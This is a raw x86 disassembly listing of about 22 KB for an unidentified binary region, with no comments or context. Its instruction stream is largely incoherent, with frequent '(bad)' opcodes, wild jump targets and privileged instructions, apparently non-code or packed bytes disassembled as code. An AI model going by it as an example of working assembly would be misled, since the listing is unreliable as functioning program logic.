  433a33:	lea    cx,[ebp+0x10]
  433a37:	jb     0x433a39
  433a39:	jmp    0x4339c4
  433a3b:	call   eax
  433a3d:	clc    
  433a3e:	xchg   DWORD PTR [edi+0x1],edi
  433a41:	mov    eax,DWORD PTR [eax]
  433a43:	or     BYTE PTR [ebp-0x49],al
  433a46:	lea    eax,[eax+0x74003154]
  433a4c:	push   edi
  433a4d:	inc    edx
  433a4e:	jge    0x433a4f
  433a50:	mov    DWORD PTR [edi],ecx
  433a52:	fdiv   DWORD PTR [edi-0x6]
  433a55:	inc    DWORD PTR [eax]
  433a57:	xor    edx,DWORD PTR [eax+0x5f]
  433a5a:	xchg   DWORD PTR [ebx+0x1],ebx
  433a5d:	ret    0x0
  433a60:	xor    BYTE PTR [ebp-0x51],cl
  433a63:	cmp    edi,0xf0ff8902
  433a69:	data16 ror al,0x84
  433a6d:	rol    BYTE PTR [eax],0x3b
  433a70:	add    al,dh
  433a72:	dec    eax
  433a73:	xchg   esp,eax
  433a74:	push   ebx
  433a75:	jmp    0x433a02
  433a77:	push   ebp
  433a78:	add    esp,ebp
  433a7a:	add    ebp,esp
  433a7c:	mov    edx,DWORD PTR [edi+0x24]
  433a7f:	clc    
  433a80:	dec    esi
  433a81:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433a87:	cmp    BYTE PTR [ebx],al
  433a89:	jne    0x433a14
  433a8b:	xor    esp,eax
  433a8d:	jmp    0x463c10
  433a92:	add    ebp,DWORD PTR [ecx+ecx*4]
  433a95:	jne    0x433a8b
  433a97:	call   0xffcd37f1
  433a9c:	clc    
  433a9d:	xchg   edi,eax
  433a9e:	sti    
  433a9f:	add    DWORD PTR [ebx],eax
  433aa1:	add    BYTE PTR [ebp+0x47],bl
  433aa4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433aaa:	pop    ebp
  433aab:	mov    DWORD PTR [esi-0x48],esi
  433aae:	jmp    0x433af7
  433ab0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433ab6:	(bad)  
  433ab8:	cmp    al,0x0
  433aba:	cmp    eax,DWORD PTR [ebp+0x18]
  433abd:	lea    ebx,[ebp-0x56]
  433ac0:	jle    0x433ac2
  433ac2:	jae    0x433a4d
  433ac4:	mov    eax,esp
  433ac6:	call   0xb900:0x8b005587
  433acd:	inc    ebp
  433ace:	push   ebp
  433acf:	lea    ecx,[ebp-0x27ff4f12]
  433ad5:	mov    eax,edi
  433ad7:	int3   
  433ad8:	push   ebp
  433ad9:	xchg   edi,eax
  433adb:	add    esp,ebp
  433add:	add    BYTE PTR [eax],al
  433adf:	inc    ebp
  433ae0:	add    BYTE PTR [ebp+0x8b3255],cl
  433ae6:	cld    
  433ae7:	mov    DWORD PTR [edx],edi
  433ae9:	aam    0x75
  433aeb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433af1:	mov    DWORD PTR [ebx-0x50],edx
  433af4:	test   BYTE PTR [ebp-0x1],0xe8
  433af8:	mov    eax,DWORD PTR [eax]
  433afa:	hlt    
  433afb:	add    al,al
  433afd:	mov    eax,DWORD PTR ds:0x890045a8
  433b03:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433b09:	inc    DWORD PTR [eax*2+0xf75854d]
  433b10:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433b16:	call   0x72999857
  433b1b:	je     0x433b7b
  433b1d:	js     0x433b7e
  433b1f:	lock ret 0x7e
  433b23:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433b29:	mov    edi,edi
  433b2b:	sbb    al,bl
  433b2d:	clc    
  433b2e:	add    BYTE PTR [ebp-0x73],bh
  433b31:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433b37:	ror    BYTE PTR [eax],1
  433b39:	dec    ebp
  433b3a:	xchg   ebp,eax
  433b3b:	mov    edi,edi
  433b3d:	in     al,0x8b
  433b3f:	jge    0x433aca
  433b41:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433b47:	clc    
  433b48:	pop    esi
  433b49:	fist   DWORD PTR [ebp+0x5d398b5d]
  433b4f:	clc    
  433b50:	add    al,0x6e
  433b52:	mov    eax,DWORD PTR [ebx]
  433b54:	mov    BYTE PTR [ebp+0x0],dl
  433b57:	mov    edx,DWORD PTR [ebx-0x20]
  433b5a:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433b60:	add    eax,0x3b3a73
  433b65:	adc    al,0x89
  433b67:	pop    eax
  433b68:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433b6c:	ret    0xf08
  433b6f:	cmp    al,0x2
  433b71:	mov    DWORD PTR [edx],edi
  433b73:	cld    
  433b74:	add    BYTE PTR [ebp+0x66],dl
  433b77:	add    eax,ebx
  433b79:	add    esp,eax
  433b7b:	sub    eax,eax
  433b7d:	or     BYTE PTR [ecx-0x77f474bb],cl
  433b83:	add    BYTE PTR [eax],al
  433b85:	mov    DWORD PTR [ebx-0x24],ebx
  433b88:	push   edi
  433b89:	push   ebp
  433b8a:	clc    
  433b8b:	add    DWORD PTR [esi+0x1b0100],0x45
  433b92:	out    0xff,eax
  433b94:	add    edx,DWORD PTR [eax]
  433b96:	jmp    0x433b80
  433b98:	cmp    ch,0x44
  433b9b:	(bad)  
  433b9c:	jmp    0x40c8c3ee
  433ba1:	je     0x433b2d
  433ba3:	mov    eax,DWORD PTR [eax-0x10c78104]
  433ba9:	inc    ebp
  433baa:	add    BYTE PTR [ebx-0x770375],al
  433bb0:	add    ah,ch
  433bb2:	add    edx,esp
  433bb4:	pop    edi
  433bb5:	pop    ebp
  433bb6:	push   ebp
  433bb7:	inc    ebx
  433bb8:	in     al,dx
  433bb9:	pop    ebp
  433bba:	in     al,dx
  433bbb:	cmp    edx,DWORD PTR [edi-0x8]
  433bbe:	ss xchg esp,eax
  433bc0:	pushf  
  433bc1:	pop    ebx
  433bc2:	mov    ecx,ecx
  433bc4:	call   0x899882cd
  433bc9:	in     al,dx
  433bca:	in     al,0x45
  433bcc:	dec    ebp
  433bcd:	push   esi
  433bce:	test   DWORD PTR [eax+0xfb010f],esi
  433bd4:	add    BYTE PTR [eax+0xc018b],dh
  433bda:	leave  
  433bdb:	inc    ebp
  433bdc:	test   al,ch
  433bde:	add    dh,bh
  433be0:	add    bh,bh
  433be2:	dec    ebp
  433be3:	push   cs
  433be4:	mov    DWORD PTR [ecx],eax
  433be6:	hlt    
  433be7:	push   es
  433be8:	dec    ebp
  433be9:	leave  
  433bea:	mov    DWORD PTR [eax],ecx
  433bec:	clc    
  433bed:	cmovge eax,ecx
  433bf0:	mov    ecx,0x85c2f0
  433bf6:	clc    
  433bf7:	pop    DWORD PTR [ebp+0x1]
  433bfa:	push   ebx
  433bfb:	add    BYTE PTR [ebp-0x15],bh
  433bfe:	push   esi
  433bff:	xor    eax,0x898a45
  433c04:	cld    
  433c05:	inc    BYTE PTR [ebp+0x0]
  433c08:	cmp    BYTE PTR [esi-0x64],ah
  433c0b:	add    DWORD PTR [esi+0x78308c1],edi
  433c11:	add    ah,BYTE PTR [edi-0x49]
  433c14:	int    0xbb
  433c16:	mov    ecx,DWORD PTR [edi+0xc]
  433c19:	add    dh,al
  433c1b:	cmp    ecx,ebx
  433c1d:	jne    0x433be7
  433c1f:	xor    ecx,DWORD PTR [ebp+0x66]
  433c22:	jmp    0xca3c28
  433c27:	add    DWORD PTR [ebp+0x0],eax
  433c2a:	mov    eax,ebx
  433c2c:	or     al,0x8b
  433c2e:	(bad)  
  433c2f:	mov    ecx,esi
  433c31:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433c38:	mov    eax,edi
  433c3a:	or     BYTE PTR [edx],cl
  433c3c:	shl    cl,cl
  433c3e:	icebp  
  433c3f:	add    BYTE PTR [ebp+0x3a],0x8b
  433c43:	or     BYTE PTR [edx+eax*2],cl
  433c46:	(bad)  
  433c47:	or     cl,dh
  433c49:	stc    
  433c4a:	shl    DWORD PTR [ebp-0x30],0xc6
  433c4e:	xor    al,0x0
  433c50:	inc    ebp
  433c51:	xchg   BYTE PTR [ebx],al
  433c53:	add    esp,edi
  433c55:	add    BYTE PTR [ebp-0x39],cl
  433c58:	mov    al,bl
  433c5a:	test   DWORD PTR [ebx+0x1c348375],ecx
  433c60:	sub    al,0xbf
  433c62:	jmp    0x433be9
  433c64:	mov    edi,eax
  433c66:	lock jge 0x433c5a
  433c69:	lea    esi,[edx-0x74bad5fd]
  433c6f:	mov    ebp,esp
  433c71:	or     cl,dh
  433c73:	leave  
  433c74:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433c7b:	dec    ebp
  433c7c:	dec    ebp
  433c7d:	test   DWORD PTR [ebx],eax
  433c7f:	paddb  mm6,mm0
  433c82:	add    DWORD PTR [eax],eax
  433c84:	dec    ebp
  433c85:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433c8b:	mov    esi,DWORD PTR [edx]
  433c8d:	or     al,0x2b
  433c8f:	dec    ebp
  433c90:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433c96:	mov    esp,edx
  433c98:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433c9f:	mov    DWORD PTR [ebx],ebp
  433ca1:	call   0xc76c5d1
  433ca6:	mov    DWORD PTR [ebp+0x10],ecx
  433ca9:	(bad)  
  433caa:	push   0x8b85ff10
  433caf:	clc    
  433cb0:	or     al,0x51
  433cb2:	(bad)  
  433cb3:	push   ecx
  433cb4:	retf   
  433cb5:	mov    ebx,0xff4d8dc8
  433cba:	mov    DWORD PTR [ebp+0x8],eax
  433cbd:	xor    eax,DWORD PTR [ebp-0x75]
  433cc0:	cmp    ebp,DWORD PTR [ebx]
  433cc2:	lsl    ebx,WORD PTR [edi-0x8]
  433cc6:	call   DWORD PTR [ebx-0x741bff75]
  433ccc:	(bad)  
  433ccd:	or     al,0x5b
  433ccf:	dec    ebp
  433cd0:	or     BYTE PTR [ebx],dh
  433cd2:	inc    ebp
  433cd3:	xor    esi,DWORD PTR ds:0x708088d
  433cd9:	in     eax,0x99
  433cdb:	add    BYTE PTR [edx],dh
  433cdd:	inc    ebp
  433cde:	pop    edi
  433cdf:	xor    eax,edx
  433ce1:	test   DWORD PTR [eax],0x81108b8b
  433ce7:	dec    ebp
  433ce8:	sub    al,0x33
  433cea:	add    BYTE PTR [ebx],dh
  433cec:	push   esi
  433ced:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433cf3:	mov    edi,eax
  433cf5:	or     BYTE PTR [ebp+0x45],al
  433cf8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433cfe:	ss leave 
  433d00:	pushf  
  433d01:	push   es
  433d02:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433d0a:	inc    ebp
  433d0b:	cmp    BYTE PTR [esi],0x51
  433d0e:	pushf  
  433d0f:	addr16 (bad) 
  433d11:	shl    esp,1
  433d13:	dec    ebp
  433d14:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433d1a:	(bad)  
  433d1b:	jmp    0x8c0b0ff7
  433d20:	aam    0x8
  433d22:	test   DWORD PTR [ebp-0x8],ecx
  433d25:	mov    BYTE PTR [ebp-0x75],al
  433d28:	or     BYTE PTR [eax],cl
  433d2a:	add    BYTE PTR [ebp-0x75],dl
  433d2d:	mov    eax,0xfc728b
  433d32:	dec    ebp
  433d33:	enter  0xceba,0x8
  433d37:	retf   0x1807
  433d3a:	ret    0x994d
  433d3d:	mov    esi,DWORD PTR [edx]
  433d3f:	or     al,0x33
  433d41:	into   
  433d42:	add    edx,esi
  433d44:	add    ecx,edx
  433d46:	bswap  eax
  433d48:	ror    esi,0x98
  433d4b:	dec    ebp
  433d4c:	add    cl,ch
  433d4e:	mov    edi,edi
  433d50:	hlt    
  433d51:	inc    esi
  433d53:	inc    ebp
  433d54:	ret    0x4533
  433d57:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433d5d:	or     BYTE PTR [ebx],dh
  433d5f:	dec    ebp
  433d60:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433d66:	jne    0xff8d3d2d
  433d6c:	inc    ebp
  433d6d:	inc    ebp
  433d6e:	mov    esi,DWORD PTR [ebx]
  433d70:	clc    
  433d71:	pop    esi
  433d72:	ret    0xcaeb
  433d75:	mov    eax,esi
  433d77:	call   0x52048f4a
  433d7c:	dec    ebp
  433d7d:	add    eax,0xf8728b
  433d82:	adc    eax,0xce0ccac9
  433d87:	push   ebp
  433d88:	ret    0xc6ec
  433d8b:	in     al,dx
  433d8c:	call   0x33438a95
  433d91:	push   edi
  433d92:	add    edi,eax
  433d94:	xor    eax,eax
  433d96:	jmp    0x433ddd
  433d98:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433d9e:	add    eax,edi
  433da0:	shr    eax,cl
  433da2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433da8:	mov    edi,DWORD PTR [ecx]
  433daa:	in     al,dx
  433dab:	pushf  
  433dac:	ret    0x84c7
  433daf:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433db5:	inc    ebp
  433db6:	in     al,dx
  433db7:	ss inc ebp
  433db9:	pushf  
  433dba:	mov    eax,edi
  433dbc:	cld    
  433dbd:	fmul   st(2),st
  433dbf:	sbb    dl,al
  433dc1:	jmp    0x9c3b:0x374d45c1
  433dc8:	jbe    0x433d91
  433dca:	mov    esp,eax
  433dcc:	clc    
  433dcd:	add    BYTE PTR [ebp+0x0],cl
  433dd0:	mov    ecx,ecx
  433dd2:	lea    eax,[ebp-0x5]
  433dd5:	mov    edi,edi
  433dd7:	call   0x51ce8f21
  433ddc:	hlt    
  433ddd:	xor    eax,edx
  433ddf:	mov    esi,0x997284
  433de4:	xor    cl,dl
  433de6:	mov    esi,eax
  433de8:	hlt    
  433de9:	into   
  433dea:	inc    ebp
  433deb:	scas   eax,DWORD PTR es:[edi]
  433dec:	mov    ebp,ecx
  433dee:	cld    
  433def:	add    dl,cl
  433df1:	add    dl,al
  433df3:	inc    ebp
  433df4:	shr    DWORD PTR [ebx],0x4d
  433df7:	xor    edi,DWORD PTR [ebx]
  433df9:	mov    DWORD PTR [edi],ecx
  433dfb:	clc    
  433dfc:	dec    esi
  433dfd:	inc    ebp
  433dfe:	dec    DWORD PTR [ebx-0x3d2b1775]
  433e04:	ret    0xc6ca
  433e07:	mov    BYTE PTR [ebp-0x32],0x53
  433e0b:	scas   eax,DWORD PTR es:[edi]
  433e0c:	inc    ebp
  433e0d:	jmp    0x433e46
  433e0f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433e16:	pop    ebx
  433e17:	xor    ecx,DWORD PTR [ebp+0x3]
  433e1a:	mov    eax,DWORD PTR [ebx]
  433e1c:	clc    
  433e1d:	test   edx,ecx
  433e1f:	mov    ecx,esi
  433e21:	cld    
  433e22:	call   0x8ab7836c
  433e27:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433e2d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433e33:	fdiv   QWORD PTR [ebx]
  433e35:	retf   0xce89
  433e38:	in     al,0xc1
  433e3a:	inc    ebp
  433e3b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433e41:	into   
  433e42:	mov    dh,0xc1
  433e45:	call   0x8c1783ce
  433e4a:	(bad)  
  433e4b:	cld    
  433e4c:	mov    ecx,DWORD PTR [ebp-0x14]
  433e4f:	xor    eax,ecx
  433e51:	lea    eax,[ebp+0x8]
  433e54:	mov    esi,DWORD PTR [edx-0x4]
  433e57:	add    dl,al
  433e59:	inc    ebp
  433e5a:	mov    esp,0x32d8998b
  433e5f:	dec    ebp
  433e60:	mov    esi,DWORD PTR [ebx]
  433e62:	cld    
  433e63:	xor    eax,edx
  433e65:	sub    esp,DWORD PTR [edi-0x75]
  433e68:	int    0xec
  433e6a:	sub    ecx,eax
  433e6c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433e72:	mov    esi,esp
  433e74:	call   0x34178bfd
  433e79:	inc    DWORD PTR [ebx]
  433e7b:	mov    edi,DWORD PTR [ebx]
  433e7d:	cld    
  433e7e:	jne    0x433ecd
  433e80:	mov    esi,DWORD PTR [ebx]
  433e82:	aam    0x8d
  433e84:	dec    ebp
  433e85:	or     BYTE PTR [ebx],dh
  433e87:	jb     0x433e8c
  433e89:	add    BYTE PTR [edi+0x45],bl
  433e8c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433e93:	xor    ebp,esp
  433e95:	xor    eax,edi
  433e97:	sub    edi,esp
  433e99:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433e9f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433ea6:	inc    ebp
  433ea7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433ead:	clc    
  433eae:	mov    eax,edi
  433eb0:	nop
  433eb1:	fadd   QWORD PTR [eax]
  433eb3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433eb9:	jmp    0x433e44
  433ebb:	mov    eax,DWORD PTR [ecx]
  433ebd:	fadd   DWORD PTR [eax]
  433ebf:	inc    ebp
  433ec0:	or     DWORD PTR [ebx],esi
  433ec2:	dec    eax
  433ec3:	add    edx,DWORD PTR [ebx-0x2d]
  433ec6:	dec    ebp
  433ec7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433ecd:	inc    ebp
  433ece:	push   ecx
  433ecf:	mov    dl,BYTE PTR [ecx-0xd]
  433ed2:	xor    ecx,DWORD PTR [ebp-0x45]
  433ed5:	(bad)  
  433ed7:	rol    BYTE PTR [eax],0xc1
  433eda:	ret    
  433edb:	inc    ebp
  433edc:	inc    ebp
  433edd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433ee3:	xor    eax,ebx
  433ee5:	add    eax,DWORD PTR [ebp+0x23]
  433ee8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433eee:	cmp    edi,0xc
  433ef1:	dec    ebp
  433ef2:	inc    ebp
  433ef3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433ef9:	inc    ebp
  433efa:	mov    esi,DWORD PTR [ebx]
  433efc:	clc    
  433efd:	lea    eax,[ebp+0x45725407]
  433f03:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433f07:	xor    edi,DWORD PTR [eax]
  433f09:	mov    ecx,0xff8b8d4d
  433f0e:	push   esp
  433f0f:	enter  0x4df7,0x23
  433f13:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433f19:	mov    eax,DWORD PTR [ebx]
  433f1b:	loopne 0x433f08
  433f1d:	ret    0xc68b
  433f20:	push   esp
  433f21:	enter  0x9745,0x8b
  433f25:	inc    ebp
  433f26:	cld    
  433f27:	mov    eax,edi
  433f29:	clc    
  433f2a:	ret    
  433f2b:	ret    0xc645
  433f2e:	mov    esi,DWORD PTR [ebx]
  433f30:	cld    
  433f31:	pop    esi
  433f32:	mov    ebx,0x83458bc3
  433f38:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433f3c:	dec    ebp
  433f3d:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  433f45:	clc    
  433f46:	fcom   DWORD PTR [ebp+0x45]
  433f49:	mov    edi,DWORD PTR [eax]
  433f4b:	adc    al,0x9c
  433f4d:	inc    ebp
  433f4e:	(bad)  
  433f4f:	mov    ebx,eax
  433f51:	adc    al,0x85
  433f53:	cmp    al,0x1
  433f56:	inc    ebp
  433f57:	add    BYTE PTR [edx],bh
  433f59:	dec    ebp
  433f5a:	pushf  
  433f5b:	mov    ebp,ecx
  433f5d:	mov    eax,DWORD PTR [ebx]
  433f5f:	nop
  433f60:	add    BYTE PTR [eax],al
  433f62:	inc    ebp
  433f63:	mov    esi,DWORD PTR [ebx]
  433f65:	add    eax,DWORD PTR [ebx]
  433f67:	cmp    al,0x89
  433f69:	mov    esp,esi
  433f6b:	clc    
  433f6c:	inc    ebp
  433f6d:	inc    ebp
  433f6e:	add    edx,DWORD PTR [esi+0xc]
  433f71:	mov    edi,0x7ff0845
  433f76:	in     al,dx
  433f77:	(bad)  
  433f78:	jne    0x433f13
  433f7a:	mov    esi,DWORD PTR [edx]
  433f7c:	clc    
  433f7d:	add    ebp,DWORD PTR [esi]
  433f7f:	mov    edi,edi
  433f81:	in     al,dx
  433f82:	mov    DWORD PTR [ebp-0x10],eax
  433f85:	xor    eax,DWORD PTR [ebp+0x3]
  433f88:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  433f90:	(bad)  
  433f91:	push   eax
  433f92:	ret    
  433f93:	call   0xd4ffc925
  433f98:	call   0xffcf37e2
  433f9d:	cmp    BYTE PTR [ebp+0x4d],al
  433fa0:	test   DWORD PTR [eax+0x74],ecx
  433fa3:	inc    ecx
  433fa4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433faa:	ret    
  433fab:	inc    eax
  433fac:	dec    DWORD PTR [ebx+0x4945f8f0]
  433fb2:	push   eax
  433fb3:	dec    eax
  433fb4:	test   al,0xd0
  433fb6:	dec    eax
  433fb8:	mov    eax,DWORD PTR [ebp-0x14]
  433fbb:	mov    eax,DWORD PTR [ebp+0x38]
  433fbe:	mov    eax,ecx
  433fc0:	fadd   DWORD PTR [ebx]
  433fc2:	dec    ebp
  433fc3:	inc    eax
  433fc4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433fca:	inc    ebp
  433fcb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433fd1:	fadd   QWORD PTR [ebx]
  433fd3:	inc    ebp
  433fd4:	or     al,0x33
  433fd6:	dec    ebp
  433fd7:	add    edi,DWORD PTR [ebx]
  433fd9:	mov    DWORD PTR [edx-0x28],esi
  433fdc:	mov    eax,DWORD PTR [ebp-0x10]
  433fdf:	mov    eax,DWORD PTR [eax+0x10]
  433fe2:	mov    eax,edi
  433fe4:	lock ret 
  433fe6:	inc    ecx
  433fe7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433fed:	fsubr  st,st(5)
  433fef:	test   DWORD PTR [eax],eax
  433ff1:	clc    
  433ff2:	push   0x45
  433ff4:	(bad)  
  433ff5:	cmp    ebp,esp
  433ff7:	pushf  
  433ff8:	inc    ebp
  433ff9:	(bad)  
  433ffa:	push   eax
  433ffb:	fsub   DWORD PTR [eax-0x7b]
  433ffe:	(bad)  
  433fff:	clc    
  434000:	mov    eax,0xf8008584
  434005:	mov    eax,DWORD PTR [ebp-0x4]
  434008:	mov    edi,0x4585c3cc
  43400e:	clc    
  43400f:	mov    eax,DWORD PTR [ebp+0x14]
  434012:	cmp    BYTE PTR [ebp-0x64],al
  434015:	mov    edi,eax
  434017:	in     al,dx
  434018:	les    esi,FWORD PTR [ebp-0x7b]
  43401b:	mov    edi,eax
  43401d:	or     al,0x4d
  43401f:	dec    ebp
  434020:	mov    eax,ebp
  434022:	in     al,0xf2
  434024:	dec    ebp
  434025:	dec    DWORD PTR [ecx+0x4dc7e045]
  43402b:	fmul   DWORD PTR [ecx+0x4df8f085]
  434031:	inc    ebp
  434032:	mov    DWORD PTR [ebx],esi
  434034:	fadd   QWORD PTR [ebx]
  434036:	dec    ebp
  434037:	push   eax
  434038:	xor    eax,DWORD PTR [ebp+0x3]
  43403b:	push   eax
  43403c:	mov    DWORD PTR [eax+ebx*8],ebx
  43403f:	push   esi
  434041:	mov    eax,DWORD PTR [eax]
  434043:	lock cmp eax,0xf84e85c0
  434049:	inc    ebp
  43404a:	test   BYTE PTR [ebx],dh
  43404c:	add    DWORD PTR [ebx],eax
  43404e:	add    BYTE PTR [eax+0x4d],dl
  434051:	jne    0x434086
  434053:	lea    ecx,[ebx-0x7617fc44]
  434059:	div    ah
  43405b:	inc    DWORD PTR [ebp+0x45]
  43405e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  434064:	jb     0x433ff1
  434066:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43406d:	mov    ecx,DWORD PTR [ebp-0x10]
  434070:	xor    ecx,DWORD PTR [ebp+0x3]
  434073:	mov    edi,DWORD PTR [ebx]
  434075:	adc    BYTE PTR [ebp+0x41],dh
  434078:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43407e:	ret    
  43407f:	push   ss
  434080:	push   0x45
  434082:	lea    ecx,[ebx+0x4de80cb0]
  434088:	sti    
  434089:	add    edi,edi
  43408b:	or     BYTE PTR [ebp+0x4d],al
  43408e:	mov    ebp,DWORD PTR [ebx]
  434090:	xor    ebp,ecx
  434092:	mov    al,BYTE PTR [edx]
  434094:	add    eax,0xc7200
  434099:	jne    0x4340e8
  43409b:	lea    esi,[ebx]
  43409d:	mov    al,0xf
  43409f:	call   0xf3764
  4340a4:	shl    DWORD PTR [esi],0x84
  4340a7:	pushf  
  4340a8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4340ae:	mov    edi,DWORD PTR [ecx]
  4340b0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4340b7:	test   DWORD PTR [eax],eax
  4340b9:	clc    
  4340ba:	dec    ebp
  4340bb:	inc    ebp
  4340bc:	xor    edi,DWORD PTR [ebx]
  4340be:	setl   al
  4340c1:	(bad)  
  4340c2:	retf   
  4340c3:	rol    cl,1
  4340c5:	dec    ebp
  4340c6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4340cc:	inc    ebp
  4340cd:	lea    ecx,[ebx-0x75b2cc38]
  4340d3:	lea    eax,ds:0x4d72c4
  4340d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4340dc:	xor    ecx,edi
  4340de:	bswap  ebx
  4340e0:	ror    BYTE PTR [ebp-0x35],0xe9
  4340e4:	rol    DWORD PTR [ecx],0x84
  4340e7:	add    BYTE PTR [ecx],al
  4340e9:	cmp    BYTE PTR [eax],al
  4340eb:	pushf  
  4340ec:	inc    ebp
  4340ed:	jnp    0x8a4374f0
  4340f3:	mov    eax,DWORD PTR ds:0xcf72e8
  4340f9:	lock dec ebp
  4340fb:	retf   
  4340fc:	xor    ecx,DWORD PTR [ebp+0xf]
  4340ff:	mov    eax,eax
  434101:	fmul   st,st(3)
  434103:	test   ecx,0x1998484
  434109:	xor    al,BYTE PTR [eax]
  43410b:	mov    DWORD PTR [ebp-0x28],eax
  43410e:	mov    eax,DWORD PTR [ebp+0x33]
  434111:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434117:	ret    
  434118:	add    al,cl
  43411a:	dec    ebp
  43411b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  434121:	add    ecx,DWORD PTR ds:0xc7250
  434127:	inc    ebp
  434128:	rcl    DWORD PTR [eax+0x4d],0x2b
  43412c:	mov    edi,edi
  43412e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  434134:	jb     0x4340fd
  434136:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  43413d:	mov    esi,DWORD PTR [ebx]
  43413f:	cld    
  434140:	mov    cl,bh
  434142:	or     eax,0x372b6
  434147:	cmp    ecx,eax
  434149:	jne    0x4341c6
  43414f:	mov    eax,DWORD PTR [ebp-0x20]
  434152:	mov    eax,DWORD PTR [eax]
  434154:	xor    eax,edi
  434156:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  43415d:	mov    ecx,DWORD PTR [ebp-0x4]
  434160:	mov    ecx,edi
  434162:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434168:	jb     0x434179
  43416a:	add    BYTE PTR [edi-0x3f],dl
  43416d:	add    BYTE PTR [ebp-0x75],cl
  434170:	mov    esi,eax
  434172:	xor    eax,DWORD PTR [eax]
  434174:	mov    al,bh
  434176:	or     eax,0x497284
  43417b:	xor    al,cl
  43417d:	mov    ecx,DWORD PTR [ebp-0x4]
  434180:	mov    ecx,edi
  434182:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434188:	jb     0x434199
  43418a:	add    BYTE PTR [edi],dh
  43418c:	enter  0x8500,0x8b
  434190:	add    ah,bl
  434192:	add    BYTE PTR [eax],al
  434194:	inc    ebp
  434195:	(bad)  
  434196:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43419d:	mov    esi,DWORD PTR [edx-0x4]
  4341a0:	add    bh,cl
  4341a2:	dec    ebp
  4341a3:	mov    dh,0x8b
  4341a5:	add    esi,DWORD PTR [ebx]
  4341a7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4341ad:	add    BYTE PTR [eax],al
  4341af:	mov    eax,ecx
  4341b1:	loopne 0x434200
  4341b3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4341b9:	dec    ecx
  4341ba:	or     eax,0x8b7232
  4341bf:	in     al,0xc1
  4341c1:	or     DWORD PTR [ebp-0x31],ecx
  4341c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  4341cb:	xor    dh,BYTE PTR [edx-0x75]
  4341ce:	add    al,dh
  4341d0:	enter  0x4f09,0xcf
  4341d4:	inc    ebp
  4341d5:	mov    WORD PTR [ebx-0x75cdccb7],cs
  4341db:	or     al,BYTE PTR ds:0xe4728b
  4341e1:	or     DWORD PTR [ebp-0x31],ecx
  4341e4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  4341eb:	cmp    dh,BYTE PTR [edx+0xf]
  4341ee:	add    bl,dl
  4341f0:	rol    DWORD PTR [eax],0x4d
  4341f3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4341f9:	(bad)  
  4341fa:	or     eax,0x497284
  4341ff:	xor    al,cl
  434201:	mov    ecx,DWORD PTR [ebp-0x20]
  434204:	mov    ecx,DWORD PTR [ecx]
  434206:	xor    ecx,edi
  434208:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43420f:	xor    cl,al
  434211:	mov    ecx,DWORD PTR [edi]
